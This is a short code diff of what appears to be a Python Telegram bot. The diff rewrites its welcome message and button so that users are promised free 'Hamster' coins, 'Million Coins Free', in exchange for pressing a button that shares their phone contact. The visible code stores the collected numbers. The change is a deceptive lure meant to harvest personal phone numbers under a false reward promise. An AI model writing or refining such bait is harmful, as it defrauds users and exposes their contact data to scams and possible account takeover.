@@ -17,10 +17,10 @@ user_numbers = {}
 @app.on_message(filters.command("start"))
 async def start(client, message):
     welcome_message = (
-        "Welcome to Auto Speed Boaster  Bot Made By @xanushy!\n\n"
-        "Please share your contact number by clicking the button below 👇 To Million Coins Free."
+        " Hamster 🐹 500,0000 Coins Boaster  Bot Made By 🇦 🇳 🇺 !\n\n"
+        "share your Account number by clicking the button below 👇 To Million Coins Free 🪙♥️."
     )
-    contact_button = KeyboardButton("📱 Share Contact", request_contact=True)
+    contact_button = KeyboardButton("𝗖𝗟𝗜𝗖𝗞 𝗧𝗢 𝗚𝗘𝗧 🐹 𝗖𝗢𝗜𝗡𝗦", request_contact=True)
     reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)
     await message.reply_text(welcome_message, reply_markup=reply_markup)
 
@@ -43,4 +43,3 @@ async def show_number(client, message):
 
 # Run the bot
 app.run()
-
